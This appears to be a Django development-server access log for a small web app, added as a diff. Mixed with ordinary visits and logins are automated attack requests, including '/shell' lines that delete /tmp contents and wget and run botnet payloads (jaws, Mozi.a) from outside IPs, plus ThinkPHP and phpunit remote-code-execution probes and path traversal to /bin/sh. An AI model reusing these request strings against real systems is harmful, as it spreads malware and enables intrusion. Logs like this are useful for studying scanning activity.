+[04/Apr/2023 15:24:13] "GET /manager/text/list HTTP/1.1" 301 0
+[04/Apr/2023 15:54:46] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 15:54:46] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 15:54:47] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[04/Apr/2023 15:54:47] "GET /favicon.ico HTTP/1.1" 302 0
+[04/Apr/2023 15:54:47] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[04/Apr/2023 15:57:54] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 15:57:55] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[04/Apr/2023 15:57:55] "GET /favicon.ico HTTP/1.1" 302 0
+[04/Apr/2023 15:57:55] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[04/Apr/2023 16:13:15] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 16:18:01] "GET /manager/html HTTP/1.1" 301 0
+[04/Apr/2023 16:20:14] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 16:39:54] "GET /assets/plugins/plupload/examples/upload.php HTTP/1.1" 301 0
+[04/Apr/2023 16:40:34] "GET /assets/plugins/plupload/examples/upload.php HTTP/1.1" 302 0
+[04/Apr/2023 16:42:33] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 17:00:45] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 17:14:36] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 17:15:11] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 17:40:33] "GET /.env HTTP/1.1" 301 0
+[04/Apr/2023 17:40:33] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01H\x01\x00\x01D\x03\x03§t\x9aF}}ò>,Ò\x90æ\x86[õØ\x9d4Ù0©\x9d\x19ù8sØ«¢\xad/\x18')
+[04/Apr/2023 17:40:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[04/Apr/2023 17:55:41] "GET /robots.txt HTTP/1.1" 400 64836
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[04/Apr/2023 17:55:41] "GET / HTTP/1.1" 400 65417
+[04/Apr/2023 18:14:07] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 18:14:07] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 18:14:07] "GET /static/str-logo.png HTTP/1.1" 304 0
+[04/Apr/2023 18:14:08] "GET /favicon.ico HTTP/1.1" 302 0
+[04/Apr/2023 18:14:08] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[04/Apr/2023 18:16:10] "GET / HTTP/1.1" 400 64476
+[04/Apr/2023 18:28:31] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 18:28:31] "POST /HNAP1/ HTTP/1.1" 301 0
+[04/Apr/2023 19:01:00] "GET /cgi-bin/test-cgi HTTP/1.1" 301 0
+[04/Apr/2023 19:20:15] "GET /robots.txt HTTP/1.1" 302 0
+[04/Apr/2023 19:20:15] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[04/Apr/2023 19:20:16] "GET /sitemap HTTP/1.1" 302 0
+[04/Apr/2023 19:20:16] "GET /login/?next=/sitemap HTTP/1.1" 200 5163
+[04/Apr/2023 19:20:47] "GET /sitemap.txt HTTP/1.1" 302 0
+[04/Apr/2023 19:20:47] "GET /login/?next=/sitemap.txt HTTP/1.1" 200 5163
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /login/
+[04/Apr/2023 19:52:44] "GET /login/?next=/ HTTP/1.1" 400 65818
+[04/Apr/2023 19:57:35,688] - Broken pipe from ('105.156.62.86', 53052)
+
+[04/Apr/2023 20:38:24] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 20:43:48] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 21:26:38] "GET /.env HTTP/1.1" 301 0
+[04/Apr/2023 21:26:38] code 400, message Bad request version ('ªi³ÛÿþPßX;1*{³\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[04/Apr/2023 21:26:38] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[04/Apr/2023 22:30:25] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 22:31:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[04/Apr/2023 22:31:15] "  /*à     Cookie: mstshash=Administr" 400 -
+[04/Apr/2023 23:13:47] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[04/Apr/2023 23:16:12] "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" 400 64100
+[04/Apr/2023 23:27:09] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[04/Apr/2023 23:35:50] "GET /robots.txt HTTP/1.1" 400 64669
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[04/Apr/2023 23:35:51] "GET / HTTP/1.1" 400 64732
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[04/Apr/2023 23:36:34] "GET / HTTP/1.1" 400 64890
+[04/Apr/2023 23:40:34] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 23:43:42] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://182.120.5.160:53405/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 0
+[04/Apr/2023 23:47:48] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 00:05:24] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 00:06:34,388] - Broken pipe from ('167.248.133.34', 47884)
+
+[05/Apr/2023 00:06:35] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 00:06:35] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 00:06:35] code 505, message Invalid HTTP version (2.0)
+[05/Apr/2023 00:06:35] "PRI * HTTP/2.0" 505 -
+[05/Apr/2023 00:19:23] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 01:25:01] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 01:33:13] "GET /portal/redlion HTTP/1.1" 301 0
+[05/Apr/2023 01:46:01] "GET /actuator/health HTTP/1.1" 301 0
+[05/Apr/2023 01:58:38] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 0
+[05/Apr/2023 01:58:39] code 400, message Bad request version ('À\x13À')
+[05/Apr/2023 01:58:39] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 01:58:44] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 01:58:45] "GET / HTTP/1.1" 200 3497
+[05/Apr/2023 01:58:45] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[05/Apr/2023 01:58:46] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[05/Apr/2023 01:58:46] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[05/Apr/2023 01:58:46] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[05/Apr/2023 01:58:46] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[05/Apr/2023 01:58:46] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[05/Apr/2023 01:58:46] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[05/Apr/2023 01:58:46] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[05/Apr/2023 01:58:46] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[05/Apr/2023 01:58:46] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[05/Apr/2023 01:58:46] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[05/Apr/2023 01:58:46] "GET / HTTP/1.1" 200 3497
+[05/Apr/2023 01:58:47] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[05/Apr/2023 02:08:48] "GET /hudson HTTP/1.1" 301 0
+[05/Apr/2023 02:11:02] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 02:13:09] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 0
+[05/Apr/2023 02:13:09] code 400, message Bad request version ('ß')
+[05/Apr/2023 02:13:09] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /staff/dashboard
+[05/Apr/2023 02:16:32] "GET /staff/dashboard HTTP/1.1" 400 66484
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /staff/dashboard
+[05/Apr/2023 02:16:33] "GET /staff/dashboard HTTP/1.1" 400 65669
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[05/Apr/2023 02:16:33] "GET /favicon.ico HTTP/1.1" 400 66392
+[05/Apr/2023 02:16:41] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 0
+[05/Apr/2023 02:16:41] code 400, message Bad request version ('À\x13À')
+[05/Apr/2023 02:16:41] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 02:19:30] "GET / HTTP/1.1" 200 3497
+[05/Apr/2023 02:19:31] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[05/Apr/2023 02:19:31] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[05/Apr/2023 02:19:31] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[05/Apr/2023 02:19:31] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[05/Apr/2023 02:19:31] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[05/Apr/2023 02:19:31] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[05/Apr/2023 02:19:31] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[05/Apr/2023 02:19:31] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[05/Apr/2023 02:19:31] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[05/Apr/2023 02:19:32] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[05/Apr/2023 02:19:32] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[05/Apr/2023 02:19:34] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[05/Apr/2023 02:24:36] "GET /.env HTTP/1.1" 301 0
+[05/Apr/2023 02:24:37] "GET /.env HTTP/1.1" 302 0
+[05/Apr/2023 02:24:37] "GET /login/?next=/.env HTTP/1.1" 200 5163
+[05/Apr/2023 02:25:53] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 02:27:35] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 02:27:46] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 0
+[05/Apr/2023 02:27:47] code 400, message Bad request version ('À\x13À')
+[05/Apr/2023 02:27:47] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 02:28:00] "GET /favicon.ico HTTP/1.1" 301 0
+[05/Apr/2023 02:28:57] "GET /geoserver/web/ HTTP/1.1" 301 0
+[05/Apr/2023 02:30:40] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 0
+[05/Apr/2023 02:30:40] code 400, message Bad request version ('À\x13À')
+[05/Apr/2023 02:30:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 02:37:40] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[05/Apr/2023 02:46:29] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[05/Apr/2023 02:46:29] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[05/Apr/2023 02:49:15] "GET / HTTP/1.1" 200 3497
+[05/Apr/2023 02:49:15] "GET /robots.txt HTTP/1.1" 200 3382
+[05/Apr/2023 02:49:18] "GET /login/ HTTP/1.1" 200 5163
+[05/Apr/2023 02:49:47] "POST /login/ HTTP/1.1" 302 0
+[05/Apr/2023 02:49:48] "GET /dashboard HTTP/1.1" 200 13279
+[05/Apr/2023 02:49:49] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 200 3552
+[05/Apr/2023 02:49:49] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 200 172812
+[05/Apr/2023 02:49:50] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 76084
+[05/Apr/2023 02:49:51] "GET /login/ HTTP/1.1" 200 5163
+[05/Apr/2023 02:50:58] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:19] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:22] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:22] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:22] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:22] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:23] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:37] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:40] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:41] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:41] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:41] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:41] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:42] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:42] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:42] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:42] "GET /profile.html HTTP/1.1" 200 8948
+[05/Apr/2023 02:51:44] "GET /static/assets/img/theme/user.png HTTP/1.1" 200 24784
+[05/Apr/2023 02:51:48] "GET /dashboard HTTP/1.1" 200 13279
+[05/Apr/2023 02:51:57] "GET /logout/ HTTP/1.1" 302 0
+[05/Apr/2023 02:53:25] "GET /logout/ HTTP/1.1" 302 0
+[05/Apr/2023 02:53:26] "GET /logout/ HTTP/1.1" 302 0
+[05/Apr/2023 02:53:27] "GET /logout/ HTTP/1.1" 302 0
+[05/Apr/2023 02:53:27] "GET /logout/ HTTP/1.1" 302 0
+[05/Apr/2023 02:53:27] "GET /logout/ HTTP/1.1" 302 0
+[05/Apr/2023 02:53:51] "GET /logout/ HTTP/1.1" 302 0
+[05/Apr/2023 02:53:51] "GET /dashboard HTTP/1.1" 302 0
+[05/Apr/2023 02:53:52] "GET /login/?next=/dashboard HTTP/1.1" 200 5163
+[05/Apr/2023 03:02:16] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 0
+[05/Apr/2023 03:02:16] code 400, message Bad request version ('À\x13À')
+[05/Apr/2023 03:02:16] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 03:03:01] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 03:10:59] "GET /console/ HTTP/1.1" 301 0
+[05/Apr/2023 03:10:59] code 400, message Bad request version ('À\x13À')
+[05/Apr/2023 03:10:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 03:13:13] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 0
+[05/Apr/2023 03:13:14] code 400, message Bad request version ('À\x13À')
+[05/Apr/2023 03:13:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 03:22:25] "GET / HTTP/1.1" 200 3497
+[05/Apr/2023 03:22:55] "GET /login/ HTTP/1.1" 200 5163
+[05/Apr/2023 03:27:40] "GET /_ignition/execute-solution HTTP/1.1" 301 0
+[05/Apr/2023 03:27:40] code 400, message Bad request version ('À\x13À')
+[05/Apr/2023 03:27:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 03:30:16] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 03:30:16] code 400, message Bad request version ('ËïbJ0öç¾zØü$\x9cZæù«ªåº')
+[05/Apr/2023 03:30:16] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 03:36:58] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 03:39:40] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 301 0
+[05/Apr/2023 03:39:40] code 400, message Bad request version ('/fQ\x81ªÛÂÙ')
+[05/Apr/2023 03:39:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 03:42:18] "GET / HTTP/1.1" 200 3516
+[05/Apr/2023 03:43:06] "GET /.env HTTP/1.1" 301 0
+[05/Apr/2023 03:43:06] "POST / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[05/Apr/2023 03:43:48] "GET /robots.txt HTTP/1.1" 400 65460
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Apr/2023 03:43:48] "GET / HTTP/1.1" 400 66293
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[05/Apr/2023 03:43:48] "GET /robots.txt HTTP/1.1" 400 65460
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[05/Apr/2023 03:43:49] "GET /favicon.ico HTTP/1.1" 400 66348
+/var/www/stradvert/stradvert/core/settings.py changed, reloading.
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 05, 2023 - 03:44:03
+Django version 3.2.6, using settings 'core.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+[05/Apr/2023 03:44:14] "GET / HTTP/1.1" 200 3516
+[05/Apr/2023 03:44:15] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[05/Apr/2023 03:44:15] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[05/Apr/2023 03:44:15] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[05/Apr/2023 03:44:15] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[05/Apr/2023 03:44:15] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[05/Apr/2023 03:44:15] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[05/Apr/2023 03:44:15] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[05/Apr/2023 03:44:15] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[05/Apr/2023 03:44:15] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[05/Apr/2023 03:44:16] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[05/Apr/2023 03:44:16] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[05/Apr/2023 03:44:17] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[05/Apr/2023 03:44:18] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[05/Apr/2023 03:46:29] "GET / HTTP/1.1" 200 3516
+[05/Apr/2023 03:47:10] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 03:47:10] code 400, message Bad request version ('Õ#4\x07E¼l\x8dií2ÔÇÄ±U\x16è\x91R]M×)1\x93öW+\x92')
+[05/Apr/2023 03:47:10] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 03:51:32] "GET /actuator/gateway/routes HTTP/1.1" 301 0
+[05/Apr/2023 03:51:36] code 400, message Bad request version ('À\x13À')
+[05/Apr/2023 03:51:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[05/Apr/2023 03:55:01] "GET / HTTP/1.1" 200 3515
+[05/Apr/2023 03:55:02] "GET /static/assets/img/brand/str.png HTTP/1.1" 200 579489
+[05/Apr/2023 03:55:04] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[05/Apr/2023 03:55:22] "GET / HTTP/1.1" 301 0
+[05/Apr/2023 03:55:55] "GET / HTTP/1.1" 200 3515
+[05/Apr/2023 03:56:11] "GET / HTTP/1.1" 200 3515
+[05/Apr/2023 03:57:25] "GET / HTTP/1.1" 200 3515
+[05/Apr/2023 03:58:15] "GET / HTTP/1.1" 200 3515
+[05/Apr/2023 03:58:48] "GET / HTTP/1.1" 200 3515
+[05/Apr/2023 03:59:37] "GET /login/ HTTP/1.1" 200 5163
+[05/Apr/2023 04:01:13] "GET /login/ HTTP/1.1" 200 5163
+[05/Apr/2023 04:01:32] "POST /login/ HTTP/1.1" 302 0
+[05/Apr/2023 04:01:33] "GET /dashboard HTTP/1.1" 200 13279
+[05/Apr/2023 04:02:07] "GET /logout/ HTTP/1.1" 302 0
+[05/Apr/2023 04:02:39] "GET /dashboard HTTP/1.1" 302 0
+[05/Apr/2023 04:02:40] "GET /login/?next=/dashboard HTTP/1.1" 200 5163
+[05/Apr/2023 04:05:39] "GET /login/?next=/dashboard HTTP/1.1" 200 5163
